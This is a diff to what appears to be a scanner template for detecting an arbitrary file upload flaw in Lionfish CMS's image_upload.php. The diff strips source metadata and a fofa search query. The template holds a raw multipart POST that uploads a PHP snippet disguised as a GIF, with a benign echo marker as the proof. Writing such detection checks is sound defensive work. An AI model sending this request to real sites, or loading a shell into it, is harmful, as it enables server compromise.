@@ -3,20 +3,14 @@ info:
   name: 狮子鱼CMS image_upload.php 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xrsi32xzq5ius99v'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xrsi32xzq5ius99v
-    fofa: body="/seller.php?s=/Public/login"
 http:
 - raw:
   - 'POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
 
 
     Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
-
-
 
 
     ------WebKitFormBoundary8UaANmWAgM4BqBSs
@@ -26,8 +20,6 @@ http:
 
 
     Content-Type: image/gif
-
-
 
 
     <?php echo "dudesuite";?>
